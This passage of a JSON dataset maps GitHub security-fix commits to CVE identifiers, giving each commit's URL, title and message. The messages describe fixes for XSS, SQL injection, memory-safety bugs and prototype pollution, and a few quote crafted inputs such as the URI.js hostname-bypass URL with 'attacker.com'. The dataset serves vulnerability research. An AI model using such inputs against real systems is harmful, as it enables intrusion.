  "9d667aed92fe3a826a2c6e8b5f9c02f1d003d33707431acf23a996b36021d12d": {
    "url": "https://github.com/ory/fosite/commit/0c9e0f6d654913ad57c507dd9a36631e1858a3e9",
    "title": "Merge pull request from GHSA-v3q9-2p3m-7g43",
    "body": "* u* u",
    "cveIds": [
      "CVE-2020-15222"
    ],
    "cveIdsCount": 1
  },
  "33149569baecc636cb0c20c8f8a65007e775987463a6854ade8ecb2122a5e9c6": {
    "url": "https://github.com/glpi-project/glpi/commit/3dc4475c56b241ad659cc5c7cb5fb65727409cf0",
    "title": "Merge pull request from GHSA-jwpv-7m4h-5gvc",
    "body": "* Prevent SQL injection through search API* better solution",
    "cveIds": [
      "CVE-2020-15226"
    ],
    "cveIdsCount": 1
  },
  "88183a273f4eebf012a92185398a3f4aac953a73cad6ad269b2bc10709a7c41a": {
    "url": "https://github.com/hpcng/singularity/commit/eba3dea260b117198fdb6faf41f2482ab2f8d53e",
    "title": "Merge pull request #5611 from dctrud/36-sec",
    "body": "Merge GHSA-7gcp-w6ww-2xv9 fixes for release 3.6.4",
    "cveIds": [
      "CVE-2020-15229"
    ],
    "cveIdsCount": 1
  },
  "6440fca5c6ed8279d0937f1ef8ec7466d2b7f909beca21ab76ea78d72ed75682": {
    "url": "https://github.com/mapfish/mapfish-print/pull/1397/commits/89155f2506b9cee822e15ce60ccae390a1419d5e",
    "title": "Remove JSONP support",
    "body": "See: https://github.com/mapfish/mapfish-print/security/code-scanning/5?query=ref%3Arefs%2Fheads%2Fmaster",
    "cveIds": [
      "CVE-2020-15231"
    ],
    "cveIdsCount": 1
  },
  "e90e18455546e061e15d9394a17602465aebacbcc4e7d8f7f787ae3cb5245b49": {
    "url": "https://github.com/LimeSurvey/LimeSurvey/pull/1479/commits/4109a8d157e46c48ca34b995ef61a6e0f6905236",
    "title": "Fixed issue #16469: Any admin user can see any question (without read…",
    "body": "… right on survey)Fixed issue #16467: Reflected XSS vulnerabilitiesDev: add a function to validate int parametersDev: throw 400/403 or 404 error",
    "cveIds": [
      "CVE-2020-16192"
    ],
    "cveIdsCount": 1
  },
  "badb4aabd8909b8c528f9a4a2ed76cae18234aeb9802919d03513139b61f0da3": {
    "url": "https://github.com/osTicket/osTicket/pull/5616/commits/fb570820ef1138776f929a179906e1d8089179d9",
    "title": "xss: Internal Notes",
    "body": "This addresses a vulnerability reported by heinhtetaung where Internal Notecontents are not correctly sanitized if errors are returned. This adds`true` as the second argument to `Format::htmlchars()` so that all contentis sanitized properly. In some cases however we cannot blanket sanitize allthe content as Inline Images, etc. tend to get obfuscated. So in those casesthis adds `Format::sanitize()` to the Internal Notes directly.",
    "cveIds": [
      "CVE-2020-16193"
    ],
    "cveIdsCount": 1
  },
  "ac5cabb804f9e9cff3c90a44d5eaac4d3aef09f1f9a43c2bd623c2f6bb1a896d": {
    "url": "https://github.com/AcademySoftwareFoundation/openexr/commit/8b5370c688a7362673c3a5256d93695617a4cd9a",
    "title": "Fix #491, issue with part number range check reconstructing chunk off…",
    "body": "…set tableThe chunk offset was incorrectly testing for a part number that was thesame size (i.e. an invalid index)Signed-off-by: Kimball Thurston <kdt3rd@gmail.com>",
    "cveIds": [
      "CVE-2020-16587"
    ],
    "cveIdsCount": 1
  },
  "256c49dd2dac254b5c41d524706fe3dc5bd341681e2d9ab666b4c0822b7a8748": {
    "url": "https://github.com/systemd/systemd/commit/1068447e6954dc6ce52f099ed174c442cb89ed54",
    "title": "sd-bus: introduce API for re-enqueuing incoming messages",
    "body": "When authorizing via PolicyKit we want to process incoming method callstwice: once to process and figure out that we need PK authentication,and a second time after we aquired PK authentication to actually executethe operation. With this new call sd_bus_enqueue_for_read() we have away to put an incoming message back into the read queue for thispurpose.This might have other uses too, for example debugging.",
    "cveIds": [
      "CVE-2020-1712"
    ],
    "cveIdsCount": 1
  },
  "2b0f7004f94f7cfa5499c610c90b3fafed7b4bb061d7c31e8b77562dda38928e": {
    "url": "https://github.com/systemd/systemd/commit/637486261528e8aa3da9f26a4487dc254f4b7abb",
    "title": "polkit: when authorizing via PK let's re-resolve callback/userdata in…",
    "body": "…stead of caching itPreviously, when doing an async PK query we'd store the originalcallback/userdata pair and call it again after the PK request iscomplete. This is problematic, since PK queries might be slow and in themeantime the userdata might be released and re-acquired. Let's avoidthis by always traversing through the message handlers so that we alwaysre-resolve the callback and userdata pair and thus can be sure it'sup-to-date and properly valid.",
    "cveIds": [
      "CVE-2020-1712"
    ],
    "cveIdsCount": 1
  },
  "580c9fa0dff00fe8d231e96071d5dc8b06b7e1252ef02abe974e377c987a357c": {
    "url": "https://github.com/wildfly-security/soteria/commit/c2479f8c39d7d661341fdcaff7f5e97c5eea1a54",
    "title": "Merge pull request #1 from darranl/CVE-2020-1732",
    "body": "[CVE-2020-1732] Adjust JASPIC integration to create a new ServerAuthModule for each request.",
    "cveIds": [
      "CVE-2020-1732"
    ],
    "cveIdsCount": 1
  },
  "1bf2897bc2e3c235f9529b726e3861ec5a7c189def65e3652a920cc8bfea0b57": {
    "url": "https://github.com/libreswan/libreswan/commit/471a3e41a449d7c753bc4edbba4239501bb62ba8",
    "title": "security: Fix for CVE-2020-1763",
    "body": "pluto will crash on a null pointer dereference when trying to log an errorfor an IKEv1 packet containing bogus information and/or flags.Signed-off-by: Paul Wouters <pwouters@redhat.com>",
    "cveIds": [
      "CVE-2020-1763"
    ],
    "cveIdsCount": 1
  },
  "7cb7a274edc394124cef86aa191c5b64fbe785f6a89a8fd67cb01c3b86cfca58": {
    "url": "https://github.com/facebook/hermes/commit/86543ac47e59c522976b5632b8bf9a2a4583c7d2",
    "title": "Added stack overflow check for hermes::vm:: hermesBuiltinApply",
    "body": "Summary: This adds a missing check for stack overflow.Reviewed By: tmikovDifferential Revision: D20104955fbshipit-source-id: 1f37e23d2e28ebcd3aa4176d134b8418e7059ebd",
    "cveIds": [
      "CVE-2020-1896"
    ],
    "cveIdsCount": 1
  },
  "89e4922d375f86a11d3d35fcd6c17cbc1fa39531cfa9342dd2538e99c8e9be55": {
    "url": "https://github.com/facebook/hhvm/commit/1107228a5128d3ca1c4add8ac1635d933cbbe2e9",
    "title": "CVE-2020-1899",
    "body": "VariableUnserializer should only recognize type 'S' in APCSerialization mode",
    "cveIds": [
      "CVE-2020-1899"
    ],
    "cveIdsCount": 1
  },
  "019e5a5432d16738384633192965b97c561e47acb95cc83aac9e0c867c0827de": {
    "url": "https://github.com/facebook/hhvm/commit/c1c4bb0cf9e076aafaf4ff3515556ef9faf906f3",
    "title": "CVE-2020-1900",
    "body": "Pre-reserve object dynamic properties when unserializing",
    "cveIds": [
      "CVE-2020-1900"
    ],
    "cveIdsCount": 1
  },
  "d81fa0aab93776671bf5508737ab16ae32ba96772fa9e1a4eec4490bab76527b": {
    "url": "https://github.com/facebook/hermes/commit/091835377369c8fd5917d9b87acffa721ad2a168",
    "title": "Correctly restore whether or not a function is an inner generator",
    "body": "Summary:If a generator was large enough to be lazily compiled, we would losethat information when reconstituting the function's context. This meantthe function was generated as a regular function instead of a generator.#utd-hermes-ignore-androidReviewed By: tmikovDifferential Revision: D23580247fbshipit-source-id: af5628bf322cbdc7c7cdfbb5f8d0756328518ea1",
    "cveIds": [
      "CVE-2020-1912"
    ],
    "cveIdsCount": 1
  },
  "772019c18bc33ff2a0d3d5e171103316d53ce91b8d2f1251246d9a8ee87278a2": {
    "url": "https://github.com/facebook/hermes/commit/8cb935cd3b2321c46aa6b7ed8454d95c75a7fca0",
    "title": "Handle set where internalSetter and Proxy are both true",
    "body": "Summary:If putComputed is called on a proxy whose target's prototypeis an array with a propname of 'length', then internalSetter will betrue, and the receiver will be a proxy. In that case, proxy needs towin; the behavior may assert or be UB otherwise.Reviewed By: tmikovDifferential Revision: D23916279fbshipit-source-id: c760356d48a02ece565fb4bc1acdafd7ccad7c68",
    "cveIds": [
      "CVE-2020-1915"
    ],
    "cveIdsCount": 1
  },
  "8693bf6fd961042c772ee12923d85a87deee5cc1896d3169f24cbfe8112fc4a8": {
    "url": "https://github.com/facebook/hhvm/commit/abe0b29e4d3a610f9bc920b8be4ad8403364c2d4",
    "title": "security fixes",
    "body": "https://hhvm.com/blog/2020/11/12/security-update.html",
    "cveIds": [
      "CVE-2020-1916"
    ],
    "cveIdsCount": 1
  },
  "fbe0299572264e4bb953972ac174b7ec4efce93f56eba751b50013505c2e060e": {
    "url": "https://github.com/facebook/hhvm/commit/08193b7f0cd3910256e00d599f0f3eb2519c44ca",
    "title": "security fixes",
    "body": "https://hhvm.com/blog/2021/02/25/security-update.html",
    "cveIds": [
      "CVE-2020-1917",
      "CVE-2020-1918",
      "CVE-2020-1919",
      "CVE-2020-1921"
    ],
    "cveIdsCount": 4
  },
  "da748a148eeea57dbcaa2b1ab2784da756c4a9860e030556d00b77f32343844d": {
    "url": "https://github.com/LimeSurvey/LimeSurvey/commit/2aada33c76efbbc35d33c149ac02b1dc16a81f62",
    "title": "Fixed issue [security] #16068: Stored Cross Site Scripting Vulnerabil…",
    "body": "…ity in permission rules. (Thanks to Matthew Aberegg)",
    "cveIds": [
      "CVE-2020-22607"
    ],
    "cveIdsCount": 1
  },
  "f57749ba5a99e64c9debb5143b534a4aa782f8308ab1a3bf094defb8602dfc55": {
    "url": "https://github.com/osTicket/osTicket/commit/d54cca0b265128f119b6c398575175cb10cf1754",
    "title": "xss: Saved Search Name",
    "body": "This mitigates an issue discovered by Matthew Aberegg where the Name fieldfor Saved Searches can be exploited via XSS to execute code. This sanitizesthe `$_POST['queue-name']` variable via `Format::htmlchars()` so we aresafe from any XSS attempts on creations and updates. All other Saved Searchcontent is parsed/sanitized correctly.",
    "cveIds": [
      "CVE-2020-22608"
    ],
    "cveIdsCount": 1
  },
  "956cafbc763339f840031db3e90a2abfccdc04597cf2db6dd92fe9aed7113580": {
    "url": "https://github.com/osTicket/osTicket/commit/6c724ea3fe352d10d457d334dc054ef81917fde1",
    "title": "xss: Queue Name",
    "body": "This mitigates an issue discovered by Matthew Aberegg where the Name fieldfor a Queue can be exploited via XSS to execute code. This sanitizes the`$_POST['queue-name']` variable in a few places via `Format::htmlchars()` sowe are safe from any XSS attempts on creations and updates.",
    "cveIds": [
      "CVE-2020-22609"
    ],
    "cveIdsCount": 1
  },
  "e892d99f5b92b64eda35e132c47bb9066530bb92d9270b2be4ab78219f1602a7": {
    "url": "https://github.com/pcmacdon/jsish/commit/858da537bde4de9d8c92466d5a866505310bc328",
    "title": "Release \"3.0.8\": Address Array alloc sizing issues from issue \"intege…",
    "body": "…r overflow and buffer overflow #5\".FossilOrigin-Name: 8c46a1d465b358110dcfb271721d35fe843a1b52f2fa24ccc10094eb8aaf6fe4",
    "cveIds": [
      "CVE-2020-22874"
    ],
    "cveIdsCount": 1
  },
  "7023b8627872cbb5ff830f8bc70d3cf5d9a72a081e34da492878026d802a8f45": {
    "url": "https://github.com/pcmacdon/jsish/commit/5408a6d93f45bf1f7acd9ae5d44e0ebd77379e98",
    "title": "Release \"3.0.6\": Fix crashes in Array for \"integer overflow #10\"",
    "body": "FossilOrigin-Name: 50642d64b8f0a4e62df68e59fcb2ef0923c3dbec8fc8a15d38b1ddbe655c38d6",
    "cveIds": [
      "CVE-2020-22875"
    ],
    "cveIdsCount": 1
  },
  "25377aab86e9cd6d22b050760c4b4d7ea537b4f80195b797677dbd5f093ffc29": {
    "url": "https://github.com/its-a-feature/Apfell/commit/5fc64502bc008388514f2b5d1160b677e3b4a7f3",
    "title": "fixed an 'Authenticated Cross-Site Scripting' bug on the command help…",
    "body": "… page reported by 'Mohamed A. Baset' of 'Seekurity SA de C.V.' at 'Seekurity.com' on April 17,2020",
    "cveIds": [
      "CVE-2020-23014"
    ],
    "cveIdsCount": 1
  },
  "68831ac22e1ce7dc508b7b9f3e3711f5bda5aeefeb60004cd562829c32ceceff": {
    "url": "https://github.com/WWBN/AVideo/commit/ecc5f40470bbafff231133f58db1df70f47bfb33",
    "title": "https://github.com//issues/3117",
    "body": "If fileURI is not a MP4 file return false",
    "cveIds": [
      "CVE-2020-23489"
    ],
    "cveIdsCount": 1
  },
  "63b0951098744ded22080bec01db592f4b8bc257124c465e578b04a9ce87047f": {
    "url": "https://github.com/WWBN/AVideo/commit/218c98cbd4a4a2c15745852bcd0f29faf101bd8c",
    "title": "https://github.com//issues/3117",
    "body": "Make sure the livelink starts with http",
    "cveIds": [
      "CVE-2020-23490"
    ],
    "cveIdsCount": 1
  },
  "67de3076cc0c2a6406479900b1ac288a98bb05115e19ba244b089f2066e53414": {
    "url": "https://github.com/avast/retdec/commit/517298bafaaff0a8e3dd60dd055a67c41b545807",
    "title": "Try to fix issue #637",
    "body": "Reference: #637",
    "cveIds": [
      "CVE-2020-23907"
    ],
    "cveIdsCount": 1
  },
  "5715f4b14989b15da88c6be731df83184220eff6645903f3ec922e03dcb17845": {
    "url": "https://github.com/MISP/MISP/commit/b3550b48f30ad9fef86c5b5c664487aaf6f52787",
    "title": "fix: [security] xss fix missing part of solution",
    "body": "- the previous fix to the xss in the homepage setter was lacking the controller changes due to a partial commit (#bf4610c947c7dc372c4078f363d2dff6ae0703a8) - as originally discovered by Mislav Božičević <mislav.bozicevic@nn.cz> - persistence of the vulnerability after the lacking fix reported by DIEGO JURADO PALLARES from Ciberinteligencia",
    "cveIds": [
      "CVE-2020-24085"
    ],
    "cveIdsCount": 1
  },
  "9d3c7a9dec98b89527731c9ea6f1a5a5f05317a9afdf01bf5f348e173078381c": {
    "url": "https://github.com/akimd/bison/commit/be95a4fe2951374676efc9454ffee8638faaf68d",
    "title": "scanner: don't crash on strings containing a NUL byte",
    "body": "We crash if the input contains a string containing a NUL byte.Reported by Suhwan Song.https://lists.gnu.org/r/bug-bison/2020-07/msg00051.html* src/flex-scanner.h (STRING_FREE): Avoid accidental use oflast_string.* src/scan-gram.l: Don't call STRING_FREE without callingSTRING_FINISH first.* tests/input.at (Invalid inputs): Check that case.",
    "cveIds": [
      "CVE-2020-24240"
    ],
    "cveIdsCount": 1
  },
  "d38def975d340c31417a37395fbc865abb62ec0084cadeac4cd544890026af30": {
    "url": "https://github.com/osTicket/osTicket/commit/518de223933eab0c5558741ce317f36958ef193d",
    "title": "xss: Draft Uploaded Attachment",
    "body": "This mitigates an XSS vulnerability reported by [The NAVEXProject](https://sisl.lab.uic.edu/projects/chess/) where if an attachment isuploaded via Draft AJAX, the filename stored/returned in the response is notsanitized. This updates `DraftAjaxAPI::_uploadInlineImage()` to sanitize thefilename before it's returned in the JSON encoded response. This alsoupdates `AttachmentFile::format()` to sanitize the filename before saving tothe backend. In addition this forces the `application/json` Content-Type onall AJAX responses that return strictly JSON; this adds another layer ofprotection.",
    "cveIds": [
      "CVE-2020-24917"
    ],
    "cveIdsCount": 1
  },
  "2b6cc437140fac7b595939632d99aff66531c7bed221808d41d0655824928684": {
    "url": "https://github.com/libass/libass/commit/6835731c2fe4164a0c50bc91d12c43b2a2b4e",
    "title": "parse_tags: don't recurse for nested \\t()",
    "body": "This fixes https://bugs.chromium.org/p/oss-fuzz/issues/detail?id=4892(stack overflow on deeply nested \\t()).This is possible because parentheses do not nest and the first ')'terminates the whole tag. Thus something like \\t(\\t(\\t(\\t(\\t() can beread in a simple loop with no recursion required. Recursion is alsonot required if the ')' is missing entirely and the outermost \\t(...never ends.See #296 for more backstory.",
    "cveIds": [
      "CVE-2020-24994"
    ],
    "cveIdsCount": 1
  },
  "2dfc751d66234a3b2cbb81ada66a5b669f4fd37c6021168d6e4eb58c009763b1": {
    "url": "https://github.com/rweather/noise-java/commit/18e86b6f8bea7326934109aa9ffa705ebf4bde90",
    "title": "Improve array bounds checks in CipherState implementations",
    "body": "Thanks to Pietro Oliva for identifying these issues.",
    "cveIds": [
      "CVE-2020-25021",
      "CVE-2020-25022",
      "CVE-2020-25023"
    ],
    "cveIdsCount": 3
  },
  "05c4715f884812d803217942e1d3c682747912a4cf879b18beb9dd6be8a31503": {
    "url": "https://github.com/nyeholt/silverstripe-advancedreports/releases",
    "title": "2.4.2 … 2.4.0 … 2.3.2 … 2.3.1 … 2.3.0 … 2.2.2 … 2.2.1 … 2.2.0 … 1.1.3 …",
    "body": "Prevent use of HTML descriptions Merge pull request #45 from nglasl/master[FIX] A queued job that no longer exists will no longer be deleted. Bundled several fixes to Freeform Report into a new release Combined reports title fix Combined report bugfixes Freeform GroupBy support Combined report sorting fixes Email field bugfix release DB report storage Generated report filename fixes",
    "cveIds": [
      "CVE-2020-25102"
    ],
    "cveIdsCount": 1
  },
  "1d867f4915beb7276875d53b2d32ea16adbe945dad0ade57d40c8b7127232fe2": {
    "url": "https://github.com/OpenMage/magento-lts/commit/0786aa48bc7b618cfe37b59f45e1da3714c533c3",
    "title": "Merge pull request from GHSA-99m6-r53j-4hh2",
    "body": "Fix for Layout XML RCE Vulnerability",
    "cveIds": [
      "CVE-2020-26252"
    ],
    "cveIdsCount": 1
  },
  "f07dd32e534c3539ecbc1df81e4a742d8a105d1220a9c883138d7f8b923849c9": {
    "url": "https://github.com/tensorflow/tensorflow/commit/ebc70b7a592420d3d2f359e4b1694c236b82c7ae",
    "title": "Validate that DataFormat* attributes form a permutation.",
    "body": "The `src_format` and `dst_format` attributes for the `DataFormatDimMap` and `DataFormatVecPermute` raw ops are supposed to determine a permutation. However, this was not validated and could result in unitialized memory accesses as well as writes outside of bounds and potential crashes.While here, we also test that the format attributes have the needed length, add tests for all validation failure cases, remove unnecessary calls to `strings::StrCat`, and fix a few grammar errors.This will be cherry-picked on the supported release branches.PiperOrigin-RevId: 346135579Change-Id: I1c76392382c89ad8f072d5bc93d70669851eb404",
    "cveIds": [
      "CVE-2020-26267"
    ],
    "cveIdsCount": 1
  },
  "7b13aee16129756ba48775886d49d80ac2069306ce7358047f1770a89e892d6b": {
    "url": "https://github.com/tensorflow/tensorflow/commit/8b5b9dc96666a3a5d27fad7179ff215e3b74b67c",
    "title": "Completely rewrite GetMatchingPaths.",
    "body": "The current parallel implementation is too complex (lambda inside lambda, two levels of parallelism) and has a read outside of bounds issue.The new implementation cleans up artifacts from the previous implementations that were left in the code as it evolves. We add multiple helper functions, and document invariants and preconditions as well as every major step. This way, we fix the security issue and a potential new one which was not caught beforePiperOrigin-RevId: 346146220Change-Id: Iec0f44673f43349797bf9944dffe9b2f779137d8",
    "cveIds": [
      "CVE-2020-26269"
    ],
    "cveIdsCount": 1
  },
  "0d4fa8c7a2b0b8efafb9da7c24ffd64e76fbf44d650391623822bd812022c663": {
    "url": "https://github.com/tensorflow/tensorflow/commit/14755416e364f17fb1870882fa778c7fec7f16e3",
    "title": "Prevent CHECK-fail in LSTM/GRU with zero-length input.",
    "body": "PiperOrigin-RevId: 346239181Change-Id: I5f233dbc076aab7bb4e31ba24f5abd4eaf99ea4f",
    "cveIds": [
      "CVE-2020-26270"
    ],
    "cveIdsCount": 1
  },
  "4ffcbeeaae8420f42789ee85522bea1caf4c6c2cc6e3be6cb31b7e813f85297d": {
    "url": "https://github.com/tensorflow/tensorflow/commit/0cc38aaa4064fd9e79101994ce9872c6d91f816b",
    "title": "Prevent unitialized memory access in GraphConstructor::MakeEdge",
    "body": "The `MakeEdge` implementation assumes that there exists an output at `output_index` of `src` node and an input at `input_index` of `dst` node. However, if this is not the case this results in accessing data out of bounds. Because we are accessing an array that is a private member of a class and only in read only mode, this usually results only in unitialized memory access. However, it is reasonable to think that malicious users could manipulate these indexes to actually read data outside the class, thus resulting in information leakage and further exploits.PiperOrigin-RevId: 346343288Change-Id: I2127da27c2023d27f26efd39afa6c853385cab6f",
    "cveIds": [
      "CVE-2020-26271"
    ],
    "cveIdsCount": 1
  },
  "3993efbfba0275786124fb2c34b456a17e1a3c783976c5ca0ce8eab1a5392bb7": {
    "url": "https://github.com/ipfs/go-ipfs/commit/b7ddba7fe47dee5b1760b8ffe897908417e577b2",
    "title": "Merge pull request #7812 from ipfs/chore/update-deps",
    "body": "chore: update deps",
    "cveIds": [
      "CVE-2020-26279"
    ],
    "cveIdsCount": 1
  },
  "c52b3f694b49bc1184636244471e5c61a14bccee6504e784b092bd93bc7282c6": {
    "url": "https://github.com/OpenMage/magento-lts/commit/4132668f5009f17456fe644742026f56d2297586",
    "title": "Merge pull request from GHSA-hj6w-xrv3-wjj9",
    "body": "Security fix for GHSA-hj6w-xrv3-wjj9",
    "cveIds": [
      "CVE-2020-26285"
    ],
    "cveIdsCount": 1
  },
  "69c2fe8151328be152eaef24af4f78280cee58b14328066ceb4096eb4a4ec8a7": {
    "url": "https://github.com/hedgedoc/hedgedoc/commit/58276ebbf4504a682454a3686dcaff88bc1069d4",
    "title": "Merge pull request from GHSA-g6w6-7xf9-m95p",
    "body": "Don't store mermaid diagrams in innerHTML",
    "cveIds": [
      "CVE-2020-26287"
    ],
    "cveIdsCount": 1
  },
  "5c9cdfde56740bedbae8e01b80b3259cf4f8517eb46a0ff9634584fccfd46dc2": {
    "url": "https://github.com/medialize/URI.js/commit/b02bf037c99ac9316b77ff8bfd840e90becf1155",
    "title": "fix(parse): treat backslash as forwardslash in authority (#403)",
    "body": "make `https://attacker.com\\\\@example.com` like `https://attacker.com\\\\@example.com/` result in `https://attacker.com/@example.com`",
    "cveIds": [
      "CVE-2020-26291"
    ],
    "cveIdsCount": 1
  },
  "58b6f25e115ab149547b654a5662db3482805747589ea89e1f5eebf27c6a1eed": {
    "url": "https://github.com/OpenMage/magento-lts/commit/9cf8c0aa1d1306051a18ace08d40279dadc1fb35",
    "title": "Merge pull request from GHSA-52c6-6v3v-f3fg",
    "body": "CMS Editor code execution update",
    "cveIds": [
      "CVE-2020-26295"
    ],
    "cveIdsCount": 1
  },
  "799d5551bd0fb6b74b5e8ad688ba0e088c2621963576212bd8240ca0e0981015": {
    "url": "https://github.com/rust-lang/mdBook/commit/32abeef088e98327ca0dfccdad92e84afa9d2e9b",
    "title": "fix xss in the search page",
    "body": "Thanks to Kamil Vavra for responsibly disclosing the vulnerabilityaccording to Rust's Security Policy.",
    "cveIds": [
      "CVE-2020-26297"
    ],
    "cveIdsCount": 1
  },
  "0a4247676eb92ae236b854009f3edfdde3dca075092331cfcc2abc74966a70de": {
    "url": "https://github.com/vmg/redcarpet/commit/a699c82292b17c8e6a62e1914d5eccc252272793",
    "title": "Fix a security issue using :quote with :escape_html",
    "body": "Reported by @johan-smits.",
    "cveIds": [
      "CVE-2020-26298"
    ],
    "cveIdsCount": 1
  },
  "1c3ef77610ad87e3ea23b6f87986b41e5940ad952c7f1ca5ad4c591ebfea1597": {
    "url": "https://github.com/autovance/ftp-srv/commit/457b859450a37cba10ff3c431eb4aa67771122e3",
    "title": "fix(fs): check resolved path against root (#224)",
    "body": "* fix(fs): check resolved path against rootThis should prevent paths from being resolved above the root.Should affect all commands that utilize the FS functions.Fixes #167* test: use __dirname for relative certs* fix: improve path resolution* chore: remove unused package* fix: normalize resolve path if absoluteOtherwise join will normalizeCo-authored-by: Tyler Stewart <tyler@autovance.com>",
    "cveIds": [
      "CVE-2020-26299"
    ],
    "cveIdsCount": 1
  },
  "c2d8358e07ac0ccfa19479cbed4ee364a9997c3858c4183c440f1963b91f8af5": {
    "url": "https://github.com/Motion-Project/motion/releases",
    "title": "release-4.3.0 …",
    "body": "Version 4.3.0 (#1096)",
    "cveIds": [
      "CVE-2020-26566"
    ],
    "cveIdsCount": 1
  },
  "99e84577be23541bc52a44612162db5d0f3f1f26fc705a808f67e5dec1ed98c6": {
    "url": "https://github.com/OpenSC/OpenSC/commit/6903aebfddc466d966c7b865fae34572bf3ed23e",
    "title": "Heap-buffer-overflow WRITE",
    "body": "fixes https://oss-fuzz.com/testcase-detail/5088104168554496",
    "cveIds": [
      "CVE-2020-26570"
    ],
    "cveIdsCount": 1
  },
  "4fc6721e67f89795b58196724694c924c608bb80c0e6b8b262164fad7d9e2588": {
    "url": "https://github.com/OpenSC/OpenSC/commit/9d294de90d1cc66956389856e60b6944b27b4817",
    "title": "prevent out of bounds write",
    "body": "fixes https://oss-fuzz.com/testcase-detail/5226571123392512",
    "cveIds": [
      "CVE-2020-26572"
    ],
    "cveIdsCount": 1
  },
  "e464103794d39a872de60b18358e95fd6231f6feabf0d9f669d435a7d1bc7189": {
    "url": "https://github.com/NeoRaider/fastd/commit/737925113363b6130879729cdff9ccc46c33eaea",
    "title": "receive: fix buffer leak when receiving invalid packets",
    "body": "For fastd versions before v20, this was just a memory leak (which couldstill be used for DoS, as it's remotely triggerable). With the newbuffer management of fastd v20, this will trigger an assertion failureinstead as soon as the buffer pool is empty.",
    "cveIds": [
      "CVE-2020-27638"
    ],
    "cveIdsCount": 1
  },
  "93cd38ae39a0498a33df7a46ff9e4c53c5b97f058e112d39f7d4ad8ead985c56": {
    "url": "https://github.com/Security-Onion-Solutions/securityonion/commit/b14670030349a2747a00ace665568ab5f51ac47b",
    "title": "[feat] Remove so-setup permission from sudoers file after iso setup",
    "body": "Closes #1701",
    "cveIds": [
      "CVE-2020-27985"
    ],
    "cveIdsCount": 1
  },
  "6c2d5f40ebf9802abeb03252dd705dd5958ab75b29dcbb718831556c0b1a6fc1": {
    "url": "https://github.com/Security-Onion-Solutions/securityonion/releases",
    "title": "",
    "body": "Merge pull request #4889 from Security-Onion-Solutions/2361update2.3.61 Merge pull request #4863 from Security-Onion-Solutions/hotfix/2.3.60Hotfix/2.3.60 CuratorFix 2.3.60FBPIPELINEMerge pull request #4800 from Security-Onion-Solutions/hotfix/2.3.60 Merge pull request #4680 from Security-Onion-Solutions/devECSFIX HOTFIX Merge pull request #4411 from Security-Onion-Solutions/hotfix-05282.3.52 Merge pull request #4254 from Security-Onion-Solutions/2.3.512.3.51 Merge pull request #4080 from Security-Onion-Solutions/hotfix2GRIDFIX Hotfix Merge pull request #4003 from Security-Onion-Solutions/dev2.3.50",
    "cveIds": [
      "CVE-2020-27985"
    ],
    "cveIdsCount": 1
  },
  "4260f46134c1e6881449234e389f83d948f35822016be1a829de282e2a2fab8a": {
    "url": "https://github.com/WordPress/wordpress-develop/commit/c9e6b98968025b1629015998d12c3102165a7d32",
    "title": "XML-RPC: Improve error messages for unprivileged users.",
    "body": "Add specific permission checks to avoid ambiguous failure messages.Props zieladam, peterwilsoncc, xknown, whyisjake.git-svn-id: https://develop.svn.wordpress.org/trunk@49380 602fd350-edb4-49c9-b593-d223f7449a82",
    "cveIds": [
      "CVE-2020-28036"
    ],
    "cveIdsCount": 1
  },
  "e999358579b986d992609689de020870da3b380672bce10abfce92d4b7268155": {
    "url": "https://github.com/WordPress/wordpress-develop/commit/2ca15d1e5ce70493c5c0c096ca0c76503d6da07c",
    "title": "Upgrade/install: Improve logic check when determining installation st…",
    "body": "…atus.Improve handling of ambiguous return values to determine if a blog is installed.Props zieladam, xknown.Merges [49377] to trunk.git-svn-id: https://develop.svn.wordpress.org/trunk@49386 602fd350-edb4-49c9-b593-d223f7449a82",
    "cveIds": [
      "CVE-2020-28037"
    ],
    "cveIdsCount": 1
  },
  "3b3190606d38e4d5472b4524f28bf3cc9a4ecd52231b69915aa80821ebc874a9": {
    "url": "https://github.com/torvalds/linux/commit/973c096f6a85e5b5f2a295126ba6928d9a6afd45",
    "title": "vgacon: remove software scrollback support",
    "body": "Yunhai Zhang recently fixed a VGA software scrollback bug in commitebfdfee (\"vgacon: Fix for missing check in scrollback handling\"),but that then made people look more closely at some of this code, andthere were more problems on the vgacon side, but also the fbcon softwarescrollback.We don't really have anybody who maintains this code - probably becausenobody actually _uses_ it any more. Sure, people still use both VGA andthe framebuffer consoles, but they are no longer the main userinterfaces to the kernel, and haven't been for decades, so these kindsof extra features end up bitrotting and not really being used.So rather than try to maintain a likely unused set of code, I'll justaggressively remove it, and see if anybody even notices. Maybe thereare people who haven't jumped on the whole GUI badnwagon yet, and thinkit's just a fad. And maybe those people use the scrollback code.If that turns out to be the case, we can resurrect this again, oncewe've found the sucker^Wmaintainer for it who actually uses it.Reported-by: NopNop Nop <nopitydays@gmail.com>Tested-by: Willy Tarreau <w@1wt.eu>Cc: 张云海 <zhangyunhai@nsfocus.com>Acked-by: Andy Lutomirski <luto@amacapital.net>Acked-by: Willy Tarreau <w@1wt.eu>Reviewed-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>",
    "cveIds": [
      "CVE-2020-28097"
    ],
    "cveIdsCount": 1
  },
  "ca356a11fcf28a8a92c2b3dcb5b8a2ba246cbe2b918fe64ad3a41cdfcfd8aced": {
    "url": "https://github.com/laurent22/joplin/releases",
    "title": "server-v2.2.8-beta … android-v2.2.1 … server-v2.2.7-beta … server-v2.2.6-beta … ios-v12.1.2 server-v2.2.5-beta … server-v2.2.4-beta …",
    "body": "Server v2.2.8 Android release v2.2.1 Server v2.2.7 Server v2.2.6 Server v2.2.5 Server v2.2.4",
    "cveIds": [
      "CVE-2020-28249"
    ],
    "cveIdsCount": 1
  },
  "5f9c67805a9211c68e8a783735cbabe18f42fd03edcb2242006b1440fded978a": {
    "url": "https://github.com/hlfshell/controlled-merge/commit/5a4b2e9ffe5a0be7f8843d4ab038599d3ae5f9d4",
    "title": "merge :Merge pull request #3 from hlfshell/fix/security_vuln",
    "body": "Fix: Security Vulnerability - check attr",
    "cveIds": [
      "CVE-2020-28268"
    ],
    "cveIdsCount": 1
  },
  "eec9be23f336182b018eea4821dea34d652cd8c892f362f19d67ec9149dc437a": {
    "url": "https://github.com/mjpclab/object-hierarchy-access/commit/7b1aa134a8bc4a376296bcfac5c3463aef2b7572",
    "title": "fix(setup): prevent assigning value to __proto__",
    "body": "Assigning value to `__proto__` polutes `Object.prototype`.Reported by Daniel Elkabes from White Source Software.",
    "cveIds": [
      "CVE-2020-28270"
    ],
    "cveIdsCount": 1
  },
